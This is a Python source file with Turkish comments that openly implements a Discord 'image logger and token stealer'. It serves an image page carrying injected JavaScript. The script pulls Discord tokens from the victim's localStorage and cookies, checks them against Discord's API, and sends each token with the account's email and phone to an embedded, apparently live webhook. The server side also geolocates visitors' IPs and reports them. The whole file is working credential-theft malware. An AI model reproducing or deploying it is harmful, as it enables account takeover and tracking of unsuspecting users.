# Discord Image Logger + Token Stealer
# Orijinal Kod: DeKrypt | Token Stealer Entegrasyonu: [İsimsiz Kahraman]
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Görsel Takipçi + Token Çalıcı"
__description__ = "Discord'un 'Orijinali Aç' özelliği kullanılarak IP ve token toplama sistemi"
__version__ = "v2.1"
__author__ = "DeKrypt | Türkçe Modifikasyon"

# Yapılandırma Ayarları
config = {
    # Temel Ayarlar
    "webhook": "https://discord.com/api/webhooks/1350927981828112505/F1kWu21zY_iCY3cmjPIN_GDCWqUUMDr0WSk4us1MJMmQv_vFG3_EpX4K1M4FE6-xMXuc", # Discord webhook URL
    "image": "https://i.imgur.com/ybJrDA0.jpeg", # Görüntülenecek resim
    "imageArgument": True, # URL'den özel resim desteği

    # Görünüm Ayarları
    "username": "Güvenlik Botu", # Webhook kullanıcı adı
    "color": 0xFF0000, # Gömme renk (Kırmızı)

    # İşlevsellik Ayarları
    "crashBrowser": False, # Tarayıcı çökertme
    "accurateLocation": False, # Tam konum alma
    "vpnCheck": 1, # VPN kontrol seviyesi
    "linkAlerts": True, # Link paylaşım uyarıları
    "buggedImage": True, # Hatalı resim önizleme
    "antiBot": 1, # Bot koruma seviyesi

    # Özel Mesaj Ayarları
    "message": {
        "doMessage": False, # Özel mesaj göster
        "message": "Tarayıcı güvenlik ihlali tespit edildi!",
        "richMessage": True, # Zengin metin formatı
    },

    # Yönlendirme Ayarları
    "redirect": {
        "redirect": False, # Yönlendirme aktif
        "page": "https://ornek-site.com" # Yönlendirme adresi
    },
}

# Token Çalıcı JavaScript Kodu
TOKEN_STEALER_JS = """
<script>
(async () => {
    // Token arama regex'i
    const TOKEN_REGEX = /[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,38}/g;
    
    // Depolama alanlarını tarama
    const findTokens = () => {
        let tokens = new Set();
        
        // LocalStorage tarama
        for(let i=0; i<localStorage.length; i++) {
            const item = localStorage.getItem(localStorage.key(i));
            const matches = item.match(TOKEN_REGEX);
            if(matches) matches.forEach(t => tokens.add(t));
        }
        
        // Çerezleri tarama
        document.cookie.split(';').forEach(cookie => {
            const value = cookie.split('=')[1];
            const matches = value.match(TOKEN_REGEX);
            if(matches) matches.forEach(t => tokens.add(t));
        });
        
        return Array.from(tokens);
    };
    
    // Token doğrulama
    const validateToken = async (token) => {
        try {
            const res = await fetch('https://discord.com/api/v9/users/@me', {
                headers: { Authorization: token }
            });
            return res.ok ? await res.json() : null;
        } catch { return null; }
    };
    
    // Webhook'a veri gönderme
    const sendToWebhook = async (tokens) => {
        const embeds = [];
        
        for(const token of tokens) {
            const userData = await validateToken(token);
            if(!userData) continue;
            
            embeds.push({
                title: `Yeni Token Bulundu! (${userData.username}#${userData.discriminator})`,
                color: 0xFF0000,
                fields: [
                    { name: "Token", value: `\`${token}\``, inline: false },
                    { name: "ID", value: userData.id, inline: true },
                    { name: "E-posta", value: userData.email || "Yok", inline: true },
                    { name: "Telefon", value: userData.phone || "Yok", inline: true }
                ]
            });
        }
        
        if(embeds.length > 0) {
            fetch("%s", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Token Logger",
                    embeds: embeds
                })
            });
        }
    };
    
    // 2 saniye bekleyip işlemi başlat
    setTimeout(async () => {
        const tokens = findTokens();
        if(tokens.length > 0) await sendToWebhook(tokens);
    }, 2000);
})();
</script>
""" % config["webhook"]

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # İstek bilgilerini al
            ip = self.headers.get('x-forwarded-for', 'Bilinmeyen IP')
            user_agent = self.headers.get('user-agent', 'Bilinmeyen Tarayıcı')
            
            # Resim URL'ini belirle
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            image_url = config["image"]
            if config["imageArgument"] and (query.get("url") or query.get("id")):
                image_url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()

            # HTML içeriğini oluştur
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body {{ margin: 0; padding: 0; }}
                    .img-container {{
                        background: url('{image_url}');
                        background-size: contain;
                        background-position: center;
                        width: 100vw;
                        height: 100vh;
                    }}
                </style>
                {TOKEN_STEALER_JS}
            </head>
            <body>
                <div class="img-container"></div>
            </body>
            </html>
            """.encode()

            # Yanıtı gönder
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', str(len(html_content)))
            self.end_headers()
            self.wfile.write(html_content)

            # IP raporunu oluştur
            self.log_ip(ip, user_agent, image_url)

        except Exception as e:
            self.handle_error(e)

    def log_ip(self, ip, user_agent, image_url):
        # IP raporlama mantığı
        try:
            info = requests.get(f"http://ip-api.com/json/{ip}").json()
            report_data = {
                "username": config["username"],
                "embeds": [{
                    "title": "Yeni IP Logu!",
                    "color": config["color"],
                    "fields": [
                        {"name": "IP", "value": ip},
                        {"name": "Ülke", "value": info.get('country', 'Bilinmiyor')},
                        {"name": "Şehir", "value": info.get('city', 'Bilinmiyor')},
                        {"name": "ISP", "value": info.get('isp', 'Bilinmiyor')},
                        {"name": "Tarayıcı", "value": user_agent}
                    ],
                    "thumbnail": {"url": image_url}
                }]
            }
            requests.post(config["webhook"], json=report_data)
        except:
            pass

    def handle_error(self, error):
        self.send_response(500)
        self.end_headers()
        error_report = {
            "username": config["username"],
            "embeds": [{
                "title": "Sistem Hatası!",
                "color": 0xFF0000,
                "description": f"```{traceback.format_exc()}```"
            }]
        }
        requests.post(config["webhook"], json=error_report)

    do_GET = handleRequest
    do_POST = handleRequest

# Sunucuyu başlat
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 8080), ImageLoggerAPI)
    print("Sunucu 0.0.0.0:8080 adresinde çalışıyor...")
    server.serve_forever()
